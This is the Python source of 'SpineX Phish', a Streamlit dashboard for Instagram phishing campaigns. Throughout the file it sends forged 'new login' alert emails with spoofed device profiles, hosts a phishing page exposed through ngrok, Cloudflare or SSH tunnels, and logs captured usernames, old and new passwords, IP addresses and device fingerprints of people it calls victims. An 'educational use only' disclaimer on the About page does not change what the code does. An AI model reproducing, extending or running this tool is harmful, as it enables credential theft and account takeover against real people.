import streamlit as st
import signal
import smtplib
import json
import os
import subprocess
import time
import re
import sys
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pyngrok import ngrok

st.set_page_config(page_title="SpineX Phish", layout="wide", initial_sidebar_state="expanded")

if 'public_url' not in st.session_state:
    st.session_state['public_url'] = ""
if 'active_tunnel' not in st.session_state:
    st.session_state['active_tunnel'] = "None"
if 'target_username' not in st.session_state:
    st.session_state['target_username'] = "Unknown_User"
if 'phish_port' not in st.session_state:
    st.session_state['phish_port'] = 8080

st.markdown("""
    <style>
    .main { background-color: #0e1117; }
    .stMetric { background-color: #161b22; border-radius: 10px; padding: 15px; border: 1px solid #30363d; }
    .stButton>button { width: 100%; border-radius: 5px; height: 3em; background-color: #238636; color: white; }
    .victim-card { background-color: #161b22; border: 1px solid #30363d; padding: 20px; border-radius: 10px; }
    .stTextArea textarea { font-family: 'Courier New', Courier, monospace; color: #00ff41; background-color: #000; }
    </style>
    """, unsafe_allow_html=True)

LOG_FILE = "victims.json"
PHISH_TEMPLATE = "assets\\phish_temp"
TEMPLATE_DIR = "assets\\mail_templates"

MOBILE_DEVICES = [
    "iPhone 15 · Safari · London, UK",
    "Samsung Galaxy S23 · Chrome · Mumbai, India",
    "Google Pixel 8 · Chrome · Tokyo, Japan",
    "iPad Air · Safari · Paris, France",
    "iPhone 17 · Instagram · Amritsar, India",
    "iPhone 15· Safari · Lucknow, India",
    "Samsung M35 · Instagram · Delhi, India",
    "Samsung Galaxy S24 · Instagram · Mumbai, India",
    "V2315 · Chrome · Delhi, India"
]

PC_DEVICES = [
    "MacBook Pro · Firefox · New York, USA",
    "Windows 11 · Chrome · Delhi, India",
    "iMac · Safari · California, USA"
]

if not os.path.exists(TEMPLATE_DIR):
    os.makedirs(TEMPLATE_DIR)

def kill_all_sessions():
    if 'server_pid' in st.session_state and st.session_state['server_pid']:
        try:
            if os.name == 'nt':
                os.system(f"taskkill /F /PID {st.session_state['server_pid']} /T")
            else:
                os.kill(st.session_state['server_pid'], signal.SIGTERM)
        except Exception as e:
            st.warning(f"Could not kill server process: {e}")
    try:
        ngrok.kill()
    except:
        pass
    if 'cf_proc' in st.session_state and st.session_state['cf_proc']:
        try:
            st.session_state['cf_proc'].terminate()
            if os.name == 'nt':
                os.system('taskkill /f /im cloudflared.exe')
            else:
                os.system('pkill cloudflared')
        except:
            pass
        st.session_state['cf_proc'] = None
    st.session_state['server_pid'] = None
    st.session_state['server_live'] = False
    st.session_state['active_tunnel'] = "None"
    st.session_state['public_url'] = ""
    
    st.success("All sessions terminated successfully.")

def start_local_server(port, directory):
    try:
        cmd = [sys.executable, "server.py"] 
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        st.session_state['server_pid'] = proc.pid
        st.session_state['server_live'] = True
        return True
    except Exception as e:
        st.error(f"Server Error: {e}")
        return False

def start_ngrok(port):
    try:
        url = ngrok.connect(port).public_url
        st.session_state['public_url'] = url
        st.session_state['active_tunnel'] = "Ngrok"
        return url
    except Exception as e:
        st.error(f"Ngrok Error: {e}")
        return None

def start_cloudflare(port):
    try:
        cmd = f"cloudflared tunnel --url http://localhost:{port}"
        st.session_state['cf_proc'] = subprocess.Popen(
            cmd.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP if os.name == 'nt' else 0
        )
        with st.spinner("Establishing Cloudflare Tunnel..."):
            time.sleep(5)
            output = ""
            try:
                for _ in range(20):
                    line = st.session_state['cf_proc'].stdout.readline()
                    if not line: break
                    output += line
                    if "trycloudflare.com" in line:
                        url_match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                        if url_match:
                            found_url = url_match.group(0)
                            st.session_state['public_url'] = found_url
                            st.session_state['active_tunnel'] = "Cloudflare"
                            return found_url
            except Exception as e:
                st.error(f"Log Reading Error: {e}")

        st.warning("Tunnel started, but URL wasn't found in logs. Check if cloudflared is installed.")
        return None
        
    except Exception as e:
        st.error(f"Cloudflared Execution Error: {e}")
        return None

def start_ssh_tunnel(port):
    ssh_cmd = f"ssh -R 80:localhost:{port} nokey@localhost.run"
    if os.name == 'nt':
        os.system(f"start cmd /k {ssh_cmd}")
    else:
        os.system(f"xterm -e {ssh_cmd} &")
    st.session_state['active_tunnel'] = "SSH"

def load_victims():
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f:
                data = json.load(f)
                return data if isinstance(data, dict) else {}
        except: return {}
    return {}

def get_template_content(file_name):
    path = os.path.join(TEMPLATE_DIR, file_name)
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f: return f.read()
    return "<h1>Error: Template not found.</h1>"

def send_email(to_email, subject, body):
    try:
        creds = st.secrets["email"]
        msg = MIMEMultipart()
        msg['From'] = creds["sender_email"]; msg['To'] = to_email; msg['Subject'] = subject
        msg.attach(MIMEText(body, 'html'))
        server = smtplib.SMTP(creds["smtp_server"], creds["port"])
        server.starttls(); server.login(creds["sender_email"], creds["app_password"])
        server.send_message(msg); server.quit()
        return True
    except Exception as e:
        st.error(f"Mail Error: {e}"); return False

def home():
    st.title("🕷️ SpineX Operations Dashboard")
    victims = load_victims()
    total_victims = len(victims)
    successful_logins = sum(1 for v in victims.values() if v.get('new_pass') or v.get('current_pass'))
    success_rate = (successful_logins / total_victims * 100) if total_victims > 0 else 0
    
    m1, m2, m3, m4 = st.columns(4)
    m1.metric("Total Targets", total_victims)
    m2.metric("Tunnel Status", st.session_state['active_tunnel'])
    m3.metric("Phish Port", st.session_state.get('phish_port', 8080))
    m4.metric("Success Rate", f"{success_rate:.1f}%")
    
    st.divider()
    
    col_list, col_details = st.columns([1, 2])
    
    with col_list:
        st.subheader("Captured Targets")
        if not victims:
            st.info("No targets captured yet.")
        else:
            search = st.text_input("🔍 Search username...")
            filtered = [v for v in victims.keys() if search.lower() in v.lower()]
            if filtered:
                selected_user = st.radio("Select Target:", filtered)
            else:
                st.warning("No matches found.")
                selected_user = None

    with col_details:
        if victims and selected_user:
            data = victims[selected_user]
            st.subheader(f"Data for User: {selected_user}")
            status = data.get('status', 'Unknown')
            if status == "AWAITING_VISIT": st.warning(f"Status: {status}")
            else: st.success(f"Status: {status}")

            with st.container():
                c1, c2 = st.columns(2)
                with c1:
                    st.write("### 🔑 Credentials")
                    cur_p = data.get('current_pass', 'Awaiting...')
                    new_p = data.get('new_pass', 'Awaiting...')
                    st.code(f"USER: {selected_user}\nOLD: {cur_p}\nNEW: {new_p}", language="text")
                    st.write(f"**Last Activity:** {data.get('timestamp')}")
                with c2:
                    st.write("### 🌐 Fingerprint")
                    st.info(f"**IP Address:** `{data.get('ip', '0.0.0.0')}`")
                    st.write(f"**Device:** {data.get('platform', 'Unknown')}")
                    st.caption(f"**User-Agent:** {data.get('browser', 'N/A')}")
                st.markdown('</div>', unsafe_allow_html=True)
                
                if st.button(f"🗑️ Delete {selected_user}"):
                    del victims[selected_user]
                    with open(LOG_FILE, "w") as f:
                        json.dump(victims, f, indent=4)
                    st.rerun()

def craft_mail():
    st.title("📧 Dynamic Campaign Creator")
    template_files = [f for f in os.listdir(TEMPLATE_DIR) if f.endswith(".html")]
    if not template_files:
        st.error("No templates found."); return
    with st.sidebar:
        st.header("🎯 Target Parameters")
        v_user = st.text_input("IG Username", placeholder="username")
        st.session_state['target_username'] = v_user if v_user else "Unknown_User"
        v_email = st.text_input("Victim Email", placeholder="target@gmail.com")
        v_link = st.text_input("Phish Link", value=st.session_state['public_url'], placeholder="Your Phish Link")
        st.divider()
        device_cat = st.selectbox("Device Category", ["Mobile", "PC"])
        if device_cat == "Mobile":
            v_device = st.selectbox("Select Mobile Device", MOBILE_DEVICES)
            device_logo = "https://ci3.googleusercontent.com/meips/ADKq_NZdDXHuEuz_FQbMSEhRUjmxs-tCpYh2z55Bf2Ll-FkF7aqdBKzRjzqzbmmijOYdi-UPlCRSLFcczK7ptAY1Se7oArTwvTM0_n5YWXcMgnqbFeU=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v4/yp/r/7JLEaDkKvA7.png" 
        else:
            v_device = st.selectbox("Select PC Device", PC_DEVICES)
            device_logo = "https://ci3.googleusercontent.com/meips/ADKq_NaC8S26F2t00wIFpWR3WReVDr2R0Vn_TVU36uDtunBoFloXqEA7EmdgKDG5uHiXgPKYZy5_ubcxVZhBrF7tJS40qmz3hQMYs6TD9u1qNy5Twow=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v4/yP/r/qw9B7nfYRiQ.png"
        v_time = st.text_input("Login Time", value=datetime.now().strftime("%B %d at %I:%M %p (UTC)"))
    selected_file = st.sidebar.selectbox("Active Template", template_files)
    raw_html = get_template_content(selected_file)
    final_html = raw_html.replace("{{username}}", v_user) \
                         .replace("{{device_info}}", v_device) \
                         .replace("{{timestamp}}", v_time) \
                         .replace("{{link}}", v_link) \
                         .replace("{{email}}", v_email) \
                         .replace("{{device_logo}}", device_logo) 
    t1, t2 = st.tabs(["Campaign Setup", "Live Preview"])

    with t1:
        col1, col2 = st.columns(2)
        with col1:
            subject = st.text_input("Subject Line", value=f"New login to Instagram from {v_device}")
        st.write("### Final Code Injection")
        st.text_area("Live Source", value=final_html, height=350)
        if st.button("🚀 Launch Campaign"):
            if v_email and subject:
                with st.spinner("Encrypting payload..."):
                    if send_email(v_email, subject, final_html):
                        st.success(f"Phish delivered to {v_email}!")
                        target_data = {
                            "username": v_user,
                            "current_pass": "",
                            "new_pass": "",
                            "status": "AWAITING_VISIT",
                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        }
                        if os.path.exists("victims.json"):
                            with open("victims.json", "r") as f:
                                current_db = json.load(f)
                        else:
                            current_db = {}
                            
                        current_db[v_user] = target_data
                        
                        with open("victims.json", "w") as f:
                            json.dump(current_db, f, indent=4)
                            
                        st.success(f"Target {v_user} added to tracking database.")
            else:
                st.warning("Recipient email is required.")
    with t2:
        st.components.v1.html(final_html, height=600, scrolling=True)

def phish_temp():
    st.title("🎣 Phish Craft & Live Deployment")
    if 'server_live' not in st.session_state:
        st.session_state['server_live'] = False
    if not os.path.exists(PHISH_TEMPLATE):
        os.makedirs(PHISH_TEMPLATE)
    phish_temp_files = [f for f in os.listdir(PHISH_TEMPLATE) if f.endswith(".html")]
    if not phish_temp_files:
        st.error(f"No templates found in `/{PHISH_TEMPLATE}`.")
        return
    temp_sel = st.sidebar.selectbox("Select Active Template", phish_temp_files)
    with open(os.path.join(PHISH_TEMPLATE, temp_sel), "r", encoding="utf-8") as f:
        html_content = f.read()
    t1, t2 = st.tabs(["👁️ Template Preview", "🌐 Live Deployment Status"])
    with t1:
        st.info("Visualizing index.html from assets/phish_temp")
        st.info("Select template from sidebar to preview.")
        st.components.v1.html(html_content, height=600, scrolling=True)

    with t2:
        st.subheader("🚀 Production Environment")
        
        c1, c2, c3 = st.columns(3)
        with c1:
            st.markdown("### 1. Local Server")
            st.session_state['phish_port'] = st.number_input("Target Port", value=8080)
            if st.button("🔥 Start Server"):
                if start_local_server(st.session_state['phish_port'], PHISH_TEMPLATE):
                    st.session_state['server_live'] = True
                    st.success(f"Hosting on {st.session_state['phish_port']}")
            
            if st.session_state['server_live']:
                st.caption("✅ Server is running")
        
        with c2:
            st.markdown("### 2. Public Tunnel")
            tunnel_provider = st.selectbox("Provider", ["Ngrok", "Cloudflare", "SSH"])
            if st.button(f"Activate {tunnel_provider}"):
                p = st.session_state['phish_port']
                if tunnel_provider == "Ngrok": start_ngrok(p)
                elif tunnel_provider == "Cloudflare": start_cloudflare(p)
                else: start_ssh_tunnel(p)
                st.rerun()
            
            if st.session_state['public_url']:
                st.success("✅ Tunnel is active")

        with c3:
            st.markdown("### 3. Session Control")
            st.write("") 
            
            if st.session_state.get('server_pid'):
                st.caption(f"Server PID: `{st.session_state['server_pid']}`")

            if st.button("🛑 KILL PHISH SESSION", type="primary"):
                with st.spinner("Terminating phish server..."):
                    kill_all_sessions()
                    time.sleep(1)
                st.success("Phish session terminated. Dashboard remains live.")
                st.rerun()

def about():
    st.title("🕸️ About SPINEX Framework")
    col1, col2 = st.columns([1, 2])
    
    with col1:
        if os.path.exists("assets/spinex_logo.png"):
            st.image("assets/spinex_logo.png", width='stretch')
        else:
            st.markdown("### [ SPINEX LOGO ]")
        st.divider()
        st.markdown("""
        **Developer:** [Vaibhav](https://github.com/vibebhavv)  
        **Version:** 1.0.0 (Stable)  
        **License:** Educational Use Only
        """)

    with col2:
        st.subheader("Mission Protocol")
        st.info("""
        **SPINEX** is a high-performance adversary simulation framework designed to demonstrate 
        the lifecycle of a modern phishing attack. By centralizing mail spoofing 
        and victim analytics, it provides a comprehensive 
        environment for cybersecurity research.
        """)
        st.subheader("🚀 Core Capabilities")
        st.markdown("""
        * **Dynamic Email Spoofing:** In-built SMTP integration with HTML template injection for realistic lure delivery.
        * **Live Exfiltration Dashboard:** Real-time data capture including credentials, IP addresses, and device fingerprints (User-Agent analysis).
        * **Device Spoofing Profiles:** Pre-configured device metadata to increase the authenticity of "New Login" alerts.
        """)

    st.divider()

    st.subheader("🛠️ Technical Stack")
    t1, t2 = st.columns(2)
    with t1:
        st.write("**Frontend & UI**")
        st.caption("Streamlit (Python-based Web Framework)")
    with t2:
        st.write("**Backend Logic**")
        st.caption("Python 3.x, SMTP/MIME, JSON persistence")

    st.divider()

    st.subheader("⚠️ Ethical & Legal Disclaimer")
    st.warning("""
    This tool is developed for **educational and authorized security testing** only. 
    Unauthorized use of this tool for malicious purposes or without explicit 
    permission from the target is strictly prohibited and may violate local laws. 
    The creator of SPINEX assumes no responsibility for any misuse or damage 
    caused by this application.
    """)

pg = st.navigation({
    "Main": [st.Page(home, title="Dashboard", icon="🖥️")],
    "Operations": [
        st.Page(craft_mail, title="Email Spoofer", icon="📨"),
        st.Page(phish_temp, title="Phish Template", icon="🎣"),
        st.Page(about, title="About", icon="❔")
    ],
})
pg.run()
